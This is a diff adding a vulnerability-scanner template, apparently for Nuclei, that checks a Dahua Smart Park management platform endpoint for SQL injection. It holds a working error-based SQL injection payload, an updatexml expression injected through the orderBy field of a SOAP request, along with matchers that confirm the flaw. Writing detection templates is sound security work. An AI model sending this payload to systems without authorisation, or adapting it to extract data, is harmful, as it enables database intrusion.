@@ -1,0 +1,48 @@
+id: dahua-smart-park-getnewstaypointdetailquery-sqli
+info:
+  name: Dahua Smart Park getNewStaypointDetailQuery SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Dahua Smart Park Management Platform getNewStaypointDetailQuery endpoint, which allows attackers to execute arbitrary SQL queries.
+http:
+  - raw:
+      - |
+        POST /portal/services/carQuery/getNewStaypointDetailQuery HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:car="http://carQuery.webservice.dssc.dahua.com">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <car:getNewStaypointDetailQuery>
+        <!--type: string-->
+        <searchJson>{}</searchJson>
+        <!--type: string-->
+        <pageJson>{"orderBy":"1 and 1=updatexml(1,concat(0x7e,md5({{t1}}),0x7e),1)--"}</pageJson>
+        <!--type: string-->
+        <extend>quae divum incedo</extend>
+        </car:getNewStaypointDetailQuery>
+        </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "XPATH syntax error"
+        part: body
+      - type: regex
+        regex:
+          - "~[a-f0-9]{32}~"
+        part: body
+    extractors:
+      - type: regex
+        regex:
+          - "~([a-f0-9]{32})~"
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
